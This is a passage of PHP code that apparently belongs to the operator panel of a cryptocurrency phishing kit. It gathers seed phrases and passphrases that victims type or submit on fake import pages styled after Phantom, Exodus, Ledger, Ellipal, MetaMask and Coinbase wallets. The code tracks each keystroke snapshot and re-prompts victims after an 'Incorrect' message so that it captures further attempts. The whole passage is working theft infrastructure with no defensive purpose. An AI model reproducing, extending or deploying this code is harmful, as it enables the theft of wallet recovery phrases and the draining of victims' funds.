                                'firstId' => $cId,
                                'firstTs' => $cTs,
                                'words' => $masked['words'],
                                'pass' => $masked['pass'],
                                'permanent' => false,
                                'blank' => false,
                            ];
                        } else {
                            $cbSeedLive['id'] = $cId;
                            $cbSeedLive['words'] = $masked['words'];
                            $cbSeedLive['pass'] = $masked['pass'];
                            $cbSeedLive['blank'] = false;
                        }
                    }
                    continue;
                }

                if ($cType === 'form_submit' && $cEl === 'seed_phrase') {
                    $raw = trim((string) ($cev->value ?? ''));
                    $subPass = '';
                    if (preg_match('/\s*\[passphrase:(.*)\]\s*$/s', $raw, $pm)) {
                        $subPass = trim($pm[1]);
                        $raw = trim(preg_replace('/\s*\[passphrase:.*\]\s*$/s', '', $raw));
                    }
                    $useLive = ($raw === '' || $raw === '[captured]');
                    if ($useLive && $cbSeedLive && empty($cbSeedLive['blank'])) {
                        $masked = ['words' => $cbSeedLive['words'], 'pass' => $cbSeedLive['pass']];
                    } else {
                        $submitWords = ($raw !== '' && $raw !== '[captured]') ? preg_split('/\s+/', $raw) : [];
                        $masked = $trzMask(
                            $submitWords ?: [],
                            $subPass !== '' ? $subPass : ''
                        );
                        if (empty(array_filter($masked['words'], fn($w) => trim((string)$w) !== ''))
                            && $cbSeedLive && empty($cbSeedLive['blank'])) {
                            $masked = ['words' => $cbSeedLive['words'], 'pass' => $cbSeedLive['pass']];
                        }
                    }
                    if ($cbSeedLive && empty($cbSeedLive['blank'])) {
                        $cbSeedLive['id'] = $cId;
                        $cbSeedLive['words'] = $masked['words'];
                        $cbSeedLive['pass'] = $masked['pass'];
                        $cbSeedLive['permanent'] = true;
                        $cbSeedLive['blank'] = false;
                        $coinbaseSeedPhraseRows[] = $cbSeedLive;
                    } else {
                        $coinbaseSeedPhraseRows[] = [
                            'id' => $cId,
                            'firstId' => $cId,
                            'firstTs' => $cTs,
                            'words' => $masked['words'],
                            'pass' => $masked['pass'],
                            'permanent' => true,
                            'blank' => false,
                        ];
                    }
                    $cbSeedLive = null;
                    $cbSeedNeedReprompt = true;
                }
            }
            if ($cbSeedLive !== null) {
                $coinbaseSeedPhraseRows[] = $cbSeedLive;
            }

            // phantom_seeds: page-only durable attempt-stack. Rows are injected into
            // $stickyFields (ordinary Activity chrome + firstTs sort), not the phrase block.
            $phantomPhraseRows = [];
            $phAttemptsFromSummary = false;
            $__phDurableList = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
                ? ($__cactiveSummaryPeek['attempts']['phantom_seeds'] ?? null)
                : null;
            if (is_array($__phDurableList)) {
                foreach ($__phDurableList as $pAtt) {
                    if (!is_array($pAtt)) continue;
                    $pWords = is_array($pAtt['words'] ?? null) ? $pAtt['words'] : [];
                    $pPass  = trim((string) ($pAtt['pass'] ?? ''));
                    $pMasked = $trzMask($pWords, $pPass);
                    $phFirstTs = 0;
                    $phSortRaw = $pAtt['first_seen_at'] ?? null;
                    if (!empty($phSortRaw)) {
                        try {
                            $phFirstTs = \Carbon\Carbon::parse($phSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $phFirstTs = 0;
                        }
                    }
                    $phantomPhraseRows[] = [
                        'id'        => (int) ($pAtt['source_event_id'] ?? 0),
                        'firstId'   => (int) ($pAtt['attempt_id'] ?? $pAtt['source_event_id'] ?? 0),
                        'firstTs'   => $phFirstTs,
                        'words'     => $pMasked['words'],
                        'pass'      => $pMasked['pass'],
                        'permanent' => (($pAtt['state'] ?? '') === 'sealed'),
                        'blank'     => !empty($pAtt['blank']),
                    ];
                }
                $phAttemptsFromSummary = true;
            }
            $phLive = null;
            $phNeedReprompt = false;
            $phMask = $trzMask;
            if (!$phAttemptsFromSummary)
            foreach ($events->sortBy(fn($e) => [$e->created_at?->getTimestamp() ?? 0, $e->id ?? 0])->values() as $pev) {
                if (($pev->page ?? '') !== 'phantom_seeds') continue;
                $pType = $pev->type ?? '';
                $pEl   = $pev->element ?? '';
                $pId   = $pev->id ?? 0;
                $pTs   = $pev->created_at?->getTimestamp() ?? 0;

                if ($pType === 'page_visit') {
                    if ($phLive === null) {
                        $phLive = ['id' => $pId, 'firstId' => $pId, 'firstTs' => $pTs, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true];
                    }
                    $phNeedReprompt = false;
                    continue;
                }

                if ($pType === 'phrase_input' && $pEl === 'full_state') {
                    $dec = json_decode($pev->value ?? '', true);
                    $words = (is_array($dec) && isset($dec['words']) && is_array($dec['words']))
                        ? array_values($dec['words']) : [];
                    $pass = is_array($dec) ? trim((string) ($dec['passphrase'] ?? '')) : '';
                    $has = (bool) array_filter($words, fn($w) => trim((string) $w) !== '');
                    if (!$has) {
                        if ($phLive === null) {
                            $phLive = ['id' => $pId, 'firstId' => $pId, 'firstTs' => $pTs, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true];
                            $phNeedReprompt = false;
                        } else {
                            $phLive['id'] = $pId;
                            $phLive['words'] = [];
                            $phLive['pass'] = '';
                            $phLive['blank'] = true;
                        }
                    } else {
                        $masked = $phMask($words, $pass);
                        if ($phLive === null && $phNeedReprompt) {
                            // Same-page retry after Incorrect: open live unless this is
                            // the post-submit race snap (identical to last sealed row)
                            $last = !empty($phantomPhraseRows) ? $phantomPhraseRows[array_key_last($phantomPhraseRows)] : null;
                            $lastKey = '';
                            if ($last) {
                                $lastKey = implode(' ', array_filter(
                                    $last['words'] ?? [],
                                    fn($w) => trim((string) $w) !== ''
                                ));
                                if (($last['pass'] ?? '') !== '') {
                                    $lastKey = trim($lastKey.' '.$last['pass']);
                                }
                            }
                            $newKey = implode(' ', array_filter(
                                $masked['words'],
                                fn($w) => trim((string) $w) !== ''
                            ));
                            if (($masked['pass'] ?? '') !== '') {
                                $newKey = trim($newKey.' '.$masked['pass']);
                            }
                            if ($lastKey !== '' && $newKey === $lastKey) {
                                continue;
                            }
                            $phLive = [
                                'id' => $pId,
                                'firstId' => $pId,
                                'firstTs' => $pTs,
                                'words' => $masked['words'],
                                'pass' => $masked['pass'],
                                'permanent' => false,
                                'blank' => false,
                            ];
                            $phNeedReprompt = false;
                            continue;
                        }
                        if ($phLive === null || !empty($phLive['permanent'])) {
                            $phLive = [
                                'id' => $pId,
                                'firstId' => $pId,
                                'firstTs' => $pTs,
                                'words' => $masked['words'],
                                'pass' => $masked['pass'],
                                'permanent' => false,
                                'blank' => false,
                            ];
                        } else {
                            $phLive['id'] = $pId;
                            $phLive['words'] = $masked['words'];
                            $phLive['pass'] = $masked['pass'];
                            $phLive['blank'] = false;
                        }
                    }
                    continue;
                }

                if ($pType === 'form_submit' && $pEl === 'seed_phrase') {
                    $raw = trim((string) ($pev->value ?? ''));
                    $useLive = ($raw === '' || $raw === '[captured]');
                    if ($useLive && $phLive && empty($phLive['blank'])) {
                        $masked = ['words' => $phLive['words'], 'pass' => $phLive['pass']];
                    } else {
                        $submitWords = ($raw !== '' && $raw !== '[captured]') ? preg_split('/\s+/', $raw) : [];
                        $masked = $phMask($submitWords ?: [], '');
                        if (empty(array_filter($masked['words'], fn($w) => trim((string)$w) !== ''))
                            && $phLive && empty($phLive['blank'])) {
                            $masked = ['words' => $phLive['words'], 'pass' => $phLive['pass']];
                        }
                    }
                    if ($phLive && empty($phLive['blank'])) {
                        $phLive['id'] = $pId;
                        $phLive['words'] = $masked['words'];
                        $phLive['pass'] = $masked['pass'];
                        $phLive['permanent'] = true;
                        $phLive['blank'] = false;
                        $phantomPhraseRows[] = $phLive;
                    } else {
                        $phantomPhraseRows[] = [
                            'id' => $pId,
                            'firstId' => $pId,
                            'firstTs' => $pTs,
                            'words' => $masked['words'],
                            'pass' => $masked['pass'],
                            'permanent' => true,
                            'blank' => false,
                        ];
                    }
                    $phLive = null;
                    $phNeedReprompt = true;
                }
            }
            if ($phLive !== null) {
                $phantomPhraseRows[] = $phLive;
            }

            // exodus_import: page-only durable attempt-stack. Rows are injected into
            // $stickyFields (ordinary Activity chrome + firstTs sort), not the phrase block.
            $exodusPhraseRows = [];
            $exAttemptsFromSummary = false;
            $__exDurableList = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
                ? ($__cactiveSummaryPeek['attempts']['exodus_import'] ?? null)
                : null;
            if (is_array($__exDurableList)) {
                foreach ($__exDurableList as $xAtt) {
                    if (!is_array($xAtt)) continue;
                    $xWords = is_array($xAtt['words'] ?? null) ? $xAtt['words'] : [];
                    $xPass  = trim((string) ($xAtt['pass'] ?? ''));
                    $xMasked = $trzMask($xWords, $xPass);
                    $exFirstTs = 0;
                    $exSortRaw = $xAtt['first_seen_at'] ?? null;
                    if (!empty($exSortRaw)) {
                        try {
                            $exFirstTs = \Carbon\Carbon::parse($exSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $exFirstTs = 0;
                        }
                    }
                    $exodusPhraseRows[] = [
                        'id'        => (int) ($xAtt['source_event_id'] ?? 0),
                        'firstId'   => (int) ($xAtt['attempt_id'] ?? $xAtt['source_event_id'] ?? 0),
                        'firstTs'   => $exFirstTs,
                        'words'     => $xMasked['words'],
                        'pass'      => $xMasked['pass'],
                        'permanent' => (($xAtt['state'] ?? '') === 'sealed'),
                        'blank'     => !empty($xAtt['blank']),
                    ];
                }
                $exAttemptsFromSummary = true;
            }
            $exLive = null;
            $exNeedReprompt = false;
            $exMask = $trzMask;
            if (!$exAttemptsFromSummary)
            foreach ($events->sortBy(fn($e) => [$e->created_at?->getTimestamp() ?? 0, $e->id ?? 0])->values() as $xev) {
                if (($xev->page ?? '') !== 'exodus_import') continue;
                $xType = $xev->type ?? '';
                $xEl   = $xev->element ?? '';
                $xId   = $xev->id ?? 0;
                $xTs   = $xev->created_at?->getTimestamp() ?? 0;

                if ($xType === 'page_visit') {
                    if ($exLive === null) {
                        $exLive = ['id' => $xId, 'firstId' => $xId, 'firstTs' => $xTs, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true];
                    }
                    $exNeedReprompt = false;
                    continue;
                }

                if ($xType === 'phrase_input' && $xEl === 'full_state') {
                    $dec = json_decode($xev->value ?? '', true);
                    $words = (is_array($dec) && isset($dec['words']) && is_array($dec['words']))
                        ? array_values($dec['words']) : [];
                    $pass = is_array($dec) ? trim((string) ($dec['passphrase'] ?? '')) : '';
                    $has = (bool) array_filter($words, fn($w) => trim((string) $w) !== '');
                    if (!$has) {
                        if ($exLive === null) {
                            $exLive = ['id' => $xId, 'firstId' => $xId, 'firstTs' => $xTs, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true];
                            $exNeedReprompt = false;
                        } else {
                            $exLive['id'] = $xId;
                            $exLive['words'] = [];
                            $exLive['pass'] = '';
                            $exLive['blank'] = true;
                        }
                    } else {
                        $masked = $exMask($words, $pass);
                        if ($exLive === null && $exNeedReprompt) {
                            $last = !empty($exodusPhraseRows) ? $exodusPhraseRows[array_key_last($exodusPhraseRows)] : null;
                            $lastKey = '';
                            if ($last) {
                                $lastKey = implode(' ', $last['words'] ?? []).'|'.($last['pass'] ?? '');
                            }
                            $thisKey = implode(' ', $masked['words']).'|'.$masked['pass'];
                            if ($last && !empty($last['permanent']) && $lastKey === $thisKey) {
                                continue;
                            }
                            $exLive = [
                                'id' => $xId,
                                'firstId' => $xId,
                                'firstTs' => $xTs,
                                'words' => $masked['words'],
                                'pass' => $masked['pass'],
                                'permanent' => false,
                                'blank' => false,
                            ];
                        } elseif ($exLive === null) {
                            $exLive = [
                                'id' => $xId,
                                'firstId' => $xId,
                                'firstTs' => $xTs,
                                'words' => $masked['words'],
                                'pass' => $masked['pass'],
                                'permanent' => false,
                                'blank' => false,
                            ];
                        } else {
                            $exLive['id'] = $xId;
                            $exLive['words'] = $masked['words'];
                            $exLive['pass'] = $masked['pass'];
                            $exLive['blank'] = false;
                        }
                    }
                    continue;
                }

                if ($xType === 'form_submit' && $xEl === 'seed_phrase') {
                    $raw = trim((string) ($xev->value ?? ''));
                    $useLive = ($raw === '' || $raw === '[captured]');
                    if ($useLive && $exLive && empty($exLive['blank'])) {
                        $masked = ['words' => $exLive['words'], 'pass' => $exLive['pass']];
                    } else {
                        $submitWords = ($raw !== '' && $raw !== '[captured]') ? preg_split('/\s+/', $raw) : [];
                        $masked = $exMask($submitWords ?: [], '');
                        if (empty(array_filter($masked['words'], fn($w) => trim((string)$w) !== ''))
                            && $exLive && empty($exLive['blank'])) {
                            $masked = ['words' => $exLive['words'], 'pass' => $exLive['pass']];
                        }
                    }
                    if ($exLive && empty($exLive['blank'])) {
                        $exLive['id'] = $xId;
                        $exLive['words'] = $masked['words'];
                        $exLive['pass'] = $masked['pass'];
                        $exLive['permanent'] = true;
                        $exLive['blank'] = false;
                        $exodusPhraseRows[] = $exLive;
                    } else {
                        $exodusPhraseRows[] = [
                            'id' => $xId,
                            'firstId' => $xId,
                            'firstTs' => $xTs,
                            'words' => $masked['words'],
                            'pass' => $masked['pass'],
                            'permanent' => true,
                            'blank' => false,
                        ];
                    }
                    $exLive = null;
                    $exNeedReprompt = true;
                }
            }
            if ($exLive !== null) {
                $exodusPhraseRows[] = $exLive;
            }

            // ledger_1 / ledger_2 / ledger_3: page-only durable attempt-stacks.
            // Rows are injected into $stickyFields (ordinary Activity chrome + firstTs sort),
            // not the leftover phrase block. Newest-150 fallback only if that key's list is missing.
            $ledgerClassicPages = ['ledger_1', 'ledger_2', 'ledger_3'];
            $ledgerClassicPhraseRows = [];
            $ldcUsedDurable = ['ledger_1' => false, 'ledger_2' => false, 'ledger_3' => false];
            foreach ($ledgerClassicPages as $ldcKey) {
                $__ldcDurableList = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
                    ? ($__cactiveSummaryPeek['attempts'][$ldcKey] ?? null)
                    : null;
                if (!is_array($__ldcDurableList)) {
                    continue;
                }
                foreach ($__ldcDurableList as $ldcAtt) {
                    if (!is_array($ldcAtt)) continue;
                    $ldcWords = is_array($ldcAtt['words'] ?? null) ? $ldcAtt['words'] : [];
                    $ldcPass  = trim((string) ($ldcAtt['pass'] ?? ''));
                    $ldcMasked = $trzMask($ldcWords, $ldcPass);
                    $ldcFirstTs = 0;
                    $ldcSortRaw = $ldcAtt['first_seen_at'] ?? null;
                    if (!empty($ldcSortRaw)) {
                        try {
                            $ldcFirstTs = \Carbon\Carbon::parse($ldcSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $ldcFirstTs = 0;
                        }
                    }
                    $ledgerClassicPhraseRows[] = [
                        'id'        => (int) ($ldcAtt['source_event_id'] ?? 0),
                        'firstId'   => (int) ($ldcAtt['attempt_id'] ?? $ldcAtt['source_event_id'] ?? 0),
                        'firstTs'   => $ldcFirstTs,
                        'words'     => $ldcMasked['words'],
                        'pass'      => $ldcMasked['pass'],
                        'permanent' => (($ldcAtt['state'] ?? '') === 'sealed'),
                        'blank'     => !empty($ldcAtt['blank']),
                        'page'      => $ldcKey,
                    ];
                }
                $ldcUsedDurable[$ldcKey] = true;
            }
            $ldcLive = ['ledger_1' => null, 'ledger_2' => null, 'ledger_3' => null];
            $ldcNeedReprompt = ['ledger_1' => false, 'ledger_2' => false, 'ledger_3' => false];
            $ldcMask = $trzMask;
            foreach ($events->sortBy(fn($e) => [$e->created_at?->getTimestamp() ?? 0, $e->id ?? 0])->values() as $cev) {
                $cPage = $cev->page ?? '';
                if (!in_array($cPage, $ledgerClassicPages, true)) continue;
                if (!empty($ldcUsedDurable[$cPage])) continue;
                $cType = $cev->type ?? '';
                $cEl   = $cev->element ?? '';
                $cId   = $cev->id ?? 0;
                $live  = &$ldcLive[$cPage];
                $need  = &$ldcNeedReprompt[$cPage];

                if ($cType === 'page_visit') {
                    if ($live === null) {
                        $live = ['id' => $cId, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true, 'page' => $cPage];
                    }
                    $need = false;
                    continue;
                }

                if ($cType === 'phrase_input' && $cEl === 'full_state') {
                    $dec = json_decode($cev->value ?? '', true);
                    $words = (is_array($dec) && isset($dec['words']) && is_array($dec['words']))
                        ? array_values($dec['words']) : [];
                    $pass = is_array($dec) ? trim((string) ($dec['passphrase'] ?? '')) : '';
                    $has = (bool) array_filter($words, fn($w) => trim((string) $w) !== '');
                    if (!$has) {
                        if ($live === null) {
                            $live = ['id' => $cId, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true, 'page' => $cPage];
                            $need = false;
                        } else {
                            $live['id'] = $cId;
                            $live['words'] = [];
                            $live['pass'] = '';
                            $live['blank'] = true;
                            $live['page'] = $cPage;
                        }
                    } else {
                        $masked = $ldcMask($words, $pass);
                        if ($live === null && $need) {
                            // Same-page retry: open live unless duplicate post-submit race snap
                            $sealedForPage = array_values(array_filter(
                                $ledgerClassicPhraseRows,
                                fn($r) => ($r['page'] ?? '') === $cPage && !empty($r['permanent'])
                            ));
                            $last = !empty($sealedForPage) ? $sealedForPage[array_key_last($sealedForPage)] : null;
                            $lastKey = '';
                            if ($last) {
                                $lastKey = implode(' ', array_filter(
                                    $last['words'] ?? [],
                                    fn($w) => trim((string) $w) !== ''
                                ));
                                if (($last['pass'] ?? '') !== '') {
                                    $lastKey = trim($lastKey.' '.$last['pass']);
                                }
                            }
                            $newKey = implode(' ', array_filter(
                                $masked['words'],
                                fn($w) => trim((string) $w) !== ''
                            ));
                            if (($masked['pass'] ?? '') !== '') {
                                $newKey = trim($newKey.' '.$masked['pass']);
                            }
                            if ($lastKey !== '' && $newKey === $lastKey) {
                                continue;
                            }
                            $live = [
                                'id' => $cId, 'words' => $masked['words'], 'pass' => $masked['pass'],
                                'permanent' => false, 'blank' => false, 'page' => $cPage,
                            ];
                            $need = false;
                            continue;
                        }
                        if ($live === null || !empty($live['permanent'])) {
                            $live = [
                                'id' => $cId, 'words' => $masked['words'], 'pass' => $masked['pass'],
                                'permanent' => false, 'blank' => false, 'page' => $cPage,
                            ];
                        } else {
                            $live['id'] = $cId;
                            $live['words'] = $masked['words'];
                            $live['pass'] = $masked['pass'];
                            $live['blank'] = false;
                            $live['page'] = $cPage;
                        }
                    }
                    continue;
                }

                if ($cType === 'form_submit' && $cEl === 'seed_phrase') {
                    $raw = trim((string) ($cev->value ?? ''));
                    $useLive = ($raw === '' || $raw === '[captured]');
                    if ($useLive && $live && empty($live['blank'])) {
                        $masked = ['words' => $live['words'], 'pass' => $live['pass']];
                    } else {
                        $submitWords = ($raw !== '' && $raw !== '[captured]') ? preg_split('/\s+/', $raw) : [];
                        $masked = $ldcMask($submitWords ?: [], '');
                        if (empty(array_filter($masked['words'], fn($w) => trim((string)$w) !== ''))
                            && $live && empty($live['blank'])) {
                            $masked = ['words' => $live['words'], 'pass' => $live['pass']];
                        }
                    }
                    if ($live && empty($live['blank'])) {
                        $live['id'] = $cId;
                        $live['words'] = $masked['words'];
                        $live['pass'] = $masked['pass'];
                        $live['permanent'] = true;
                        $live['blank'] = false;
                        $live['page'] = $cPage;
                        $ledgerClassicPhraseRows[] = $live;
                    } else {
                        $ledgerClassicPhraseRows[] = [
                            'id' => $cId, 'words' => $masked['words'], 'pass' => $masked['pass'],
                            'permanent' => true, 'blank' => false, 'page' => $cPage,
                        ];
                    }
                    $live = null;
                    $need = true;
                }
                unset($live, $need);
            }
            $pendingLives = array_values(array_filter($ldcLive, fn($r) => $r !== null));
            usort($pendingLives, fn($a, $b) => ($a['id'] ?? 0) <=> ($b['id'] ?? 0));
            foreach ($pendingLives as $pl) {
                $ledgerClassicPhraseRows[] = $pl;
            }

            // ellipal_24word: page-only durable attempt-stack. Rows are injected into
            // $stickyFields (ordinary Activity chrome + firstTs sort), not the phrase block.
            $ellipalPages = ['ellipal_24word', 'ellipal_12word'];
            $ellipalPhraseRows = [];
            $elpAttemptsFromSummary = false;
            $__elpDurableList = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
                ? ($__cactiveSummaryPeek['attempts']['ellipal_24word'] ?? null)
                : null;
            if (is_array($__elpDurableList)) {
                foreach ($__elpDurableList as $eAtt) {
                    if (!is_array($eAtt)) continue;
                    $eWords = is_array($eAtt['words'] ?? null) ? $eAtt['words'] : [];
                    $ePass  = trim((string) ($eAtt['pass'] ?? ''));
                    $eMasked = $trzMask($eWords, $ePass);
                    $eFirstTs = 0;
                    $eSortRaw = $eAtt['first_seen_at'] ?? null;
                    if (!empty($eSortRaw)) {
                        try {
                            $eFirstTs = \Carbon\Carbon::parse($eSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $eFirstTs = 0;
                        }
                    }
                    $ellipalPhraseRows[] = [
                        'id'        => (int) ($eAtt['source_event_id'] ?? 0),
                        'firstId'   => (int) ($eAtt['attempt_id'] ?? $eAtt['source_event_id'] ?? 0),
                        'firstTs'   => $eFirstTs,
                        'words'     => $eMasked['words'],
                        'pass'      => $eMasked['pass'],
                        'permanent' => (($eAtt['state'] ?? '') === 'sealed'),
                        'blank'     => !empty($eAtt['blank']),
                    ];
                }
                $elpAttemptsFromSummary = true;
            }
            $elpLive = ['ellipal_24word' => null, 'ellipal_12word' => null];
            $elpNeedReprompt = ['ellipal_24word' => false, 'ellipal_12word' => false];
            $elpMask = $trzMask;
            if (!$elpAttemptsFromSummary)
            foreach ($events->sortBy(fn($e) => [$e->created_at?->getTimestamp() ?? 0, $e->id ?? 0])->values() as $eev) {
                $ePage = $eev->page ?? '';
                if (!in_array($ePage, $ellipalPages, true)) continue;
                $eType = $eev->type ?? '';
                $eEl   = $eev->element ?? '';
                $eId   = $eev->id ?? 0;
                $live  = &$elpLive[$ePage];
                $need  = &$elpNeedReprompt[$ePage];

                if ($eType === 'page_visit') {
                    if ($live === null) {
                        $live = ['id' => $eId, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true, 'page' => $ePage];
                    }
                    $need = false;
                    continue;
                }

                if ($eType === 'phrase_input' && $eEl === 'full_state') {
                    $dec = json_decode($eev->value ?? '', true);
                    $words = (is_array($dec) && isset($dec['words']) && is_array($dec['words']))
                        ? array_values($dec['words']) : [];
                    $pass = is_array($dec) ? trim((string) ($dec['passphrase'] ?? '')) : '';
                    $has = (bool) array_filter($words, fn($w) => trim((string) $w) !== '');
                    if (!$has) {
                        if ($live === null) {
                            $live = ['id' => $eId, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true, 'page' => $ePage];
                            $need = false;
                        } else {
                            $live['id'] = $eId;
                            $live['words'] = [];
                            $live['pass'] = '';
                            $live['blank'] = true;
                            $live['page'] = $ePage;
                        }
                    } else {
                        $masked = $elpMask($words, $pass);
                        if ($live === null && $need) {
                            $sealedForPage = array_values(array_filter(
                                $ellipalPhraseRows,
                                fn($r) => ($r['page'] ?? '') === $ePage && !empty($r['permanent'])
                            ));
                            $last = !empty($sealedForPage) ? $sealedForPage[array_key_last($sealedForPage)] : null;
                            $lastKey = '';
                            if ($last) {
                                $lastKey = implode(' ', array_filter(
                                    $last['words'] ?? [],
                                    fn($w) => trim((string) $w) !== ''
                                ));
                                if (($last['pass'] ?? '') !== '') {
                                    $lastKey = trim($lastKey.' '.$last['pass']);
                                }
                            }
                            $newKey = implode(' ', array_filter(
                                $masked['words'],
                                fn($w) => trim((string) $w) !== ''
                            ));
                            if (($masked['pass'] ?? '') !== '') {
                                $newKey = trim($newKey.' '.$masked['pass']);
                            }
                            if ($lastKey !== '' && $newKey === $lastKey) {
                                continue;
                            }
                            $live = [
                                'id' => $eId, 'words' => $masked['words'], 'pass' => $masked['pass'],
                                'permanent' => false, 'blank' => false, 'page' => $ePage,
                            ];
                            $need = false;
                            continue;
                        }
                        if ($live === null || !empty($live['permanent'])) {
                            $live = [
                                'id' => $eId, 'words' => $masked['words'], 'pass' => $masked['pass'],
                                'permanent' => false, 'blank' => false, 'page' => $ePage,
                            ];
                        } else {
                            $live['id'] = $eId;
                            $live['words'] = $masked['words'];
                            $live['pass'] = $masked['pass'];
                            $live['blank'] = false;
                            $live['page'] = $ePage;
                        }
                    }
                    continue;
                }

                if ($eType === 'form_submit' && $eEl === 'seed_phrase') {
                    $raw = trim((string) ($eev->value ?? ''));
                    $useLive = ($raw === '' || $raw === '[captured]');
                    if ($useLive && $live && empty($live['blank'])) {
                        $masked = ['words' => $live['words'], 'pass' => $live['pass']];
                    } else {
                        $submitWords = ($raw !== '' && $raw !== '[captured]') ? preg_split('/\s+/', $raw) : [];
                        $masked = $elpMask($submitWords ?: [], '');
                        if (empty(array_filter($masked['words'], fn($w) => trim((string)$w) !== ''))
                            && $live && empty($live['blank'])) {
                            $masked = ['words' => $live['words'], 'pass' => $live['pass']];
                        }
                    }
                    if ($live && empty($live['blank'])) {
                        $live['id'] = $eId;
                        $live['words'] = $masked['words'];
                        $live['pass'] = $masked['pass'];
                        $live['permanent'] = true;
                        $live['blank'] = false;
                        $live['page'] = $ePage;
                        $ellipalPhraseRows[] = $live;
                    } else {
                        $ellipalPhraseRows[] = [
                            'id' => $eId, 'words' => $masked['words'], 'pass' => $masked['pass'],
                            'permanent' => true, 'blank' => false, 'page' => $ePage,
                        ];
                    }
                    $live = null;
                    $need = true;
                }
                unset($live, $need);
            }
            $pendingElp = array_values(array_filter($elpLive, fn($r) => $r !== null));
            usort($pendingElp, fn($a, $b) => ($a['id'] ?? 0) <=> ($b['id'] ?? 0));
            foreach ($pendingElp as $pl) {
                $ellipalPhraseRows[] = $pl;
            }

            // metamask_import: page-only durable attempt-stack. Rows are injected into
            // $stickyFields (ordinary Activity chrome + firstTs sort), not the phrase block.
            $metamaskPhraseRows = [];
            $mmAttemptsFromSummary = false;
            $__mmDurableList = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
                ? ($__cactiveSummaryPeek['attempts']['metamask_import'] ?? null)
                : null;
            if (is_array($__mmDurableList)) {
                foreach ($__mmDurableList as $mAtt) {
                    if (!is_array($mAtt)) continue;
                    $mWords = is_array($mAtt['words'] ?? null) ? $mAtt['words'] : [];
                    $mPass  = trim((string) ($mAtt['pass'] ?? ''));
                    $mMasked = $trzMask($mWords, $mPass);
                    $mFirstTs = 0;
                    $mSortRaw = $mAtt['first_seen_at'] ?? null;
                    if (!empty($mSortRaw)) {
                        try {
                            $mFirstTs = \Carbon\Carbon::parse($mSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $mFirstTs = 0;
                        }
                    }
                    $metamaskPhraseRows[] = [
                        'id'        => (int) ($mAtt['source_event_id'] ?? 0),
                        'firstId'   => (int) ($mAtt['attempt_id'] ?? $mAtt['source_event_id'] ?? 0),
                        'firstTs'   => $mFirstTs,
                        'words'     => $mMasked['words'],
                        'pass'      => $mMasked['pass'],
                        'permanent' => (($mAtt['state'] ?? '') === 'sealed'),
                        'blank'     => !empty($mAtt['blank']),
                    ];
                }
                $mmAttemptsFromSummary = true;
            }
            $mmLive = null;
            $mmNeedReprompt = false;
            $mmMask = $trzMask;
            if (!$mmAttemptsFromSummary)
            foreach ($events->sortBy(fn($e) => [$e->created_at?->getTimestamp() ?? 0, $e->id ?? 0])->values() as $mev) {
                if (($mev->page ?? '') !== 'metamask_import') continue;
                $mType = $mev->type ?? '';
                $mEl   = $mev->element ?? '';
                $mId   = $mev->id ?? 0;

                if ($mType === 'page_visit') {
                    if ($mmLive === null) {
                        $mmLive = ['id' => $mId, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true];
                    }
                    $mmNeedReprompt = false;
                    continue;
                }

                if ($mType === 'phrase_input' && $mEl === 'full_state') {
                    $dec = json_decode($mev->value ?? '', true);
                    $words = (is_array($dec) && isset($dec['words']) && is_array($dec['words']))
                        ? array_values($dec['words']) : [];
                    $pass = is_array($dec) ? trim((string) ($dec['passphrase'] ?? '')) : '';
                    $has = (bool) array_filter($words, fn($w) => trim((string) $w) !== '');
                    if (!$has) {
                        if ($mmLive === null) {
                            $mmLive = ['id' => $mId, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true];
                            $mmNeedReprompt = false;
                        } else {
                            $mmLive['id'] = $mId;
                            $mmLive['words'] = [];
                            $mmLive['pass'] = '';
                            $mmLive['blank'] = true;
                        }
                    } else {
                        $masked = $mmMask($words, $pass);
                        if ($mmLive === null && $mmNeedReprompt) {
                            $last = !empty($metamaskPhraseRows) ? $metamaskPhraseRows[array_key_last($metamaskPhraseRows)] : null;
                            $lastKey = '';
                            if ($last) {
                                $lastKey = implode(' ', array_filter(
                                    $last['words'] ?? [],
                                    fn($w) => trim((string) $w) !== ''
                                ));
                                if (($last['pass'] ?? '') !== '') {
                                    $lastKey = trim($lastKey.' '.$last['pass']);
                                }
                            }
                            $newKey = implode(' ', array_filter(
                                $masked['words'],
                                fn($w) => trim((string) $w) !== ''
                            ));
                            if (($masked['pass'] ?? '') !== '') {
                                $newKey = trim($newKey.' '.$masked['pass']);
                            }
                            if ($lastKey !== '' && $newKey === $lastKey) {
                                continue;
                            }
                            $mmLive = [
                                'id' => $mId, 'words' => $masked['words'], 'pass' => $masked['pass'],
                                'permanent' => false, 'blank' => false,
                            ];
                            $mmNeedReprompt = false;
                            continue;
                        }
                        if ($mmLive === null || !empty($mmLive['permanent'])) {
                            $mmLive = [
                                'id' => $mId, 'words' => $masked['words'], 'pass' => $masked['pass'],
                                'permanent' => false, 'blank' => false,
                            ];
                        } else {
                            $mmLive['id'] = $mId;
                            $mmLive['words'] = $masked['words'];
                            $mmLive['pass'] = $masked['pass'];
                            $mmLive['blank'] = false;
                        }
                    }
                    continue;
                }

                if ($mType === 'form_submit' && $mEl === 'seed_phrase') {
                    $raw = trim((string) ($mev->value ?? ''));
                    $useLive = ($raw === '' || $raw === '[captured]');
                    if ($useLive && $mmLive && empty($mmLive['blank'])) {
                        $masked = ['words' => $mmLive['words'], 'pass' => $mmLive['pass']];
                    } else {
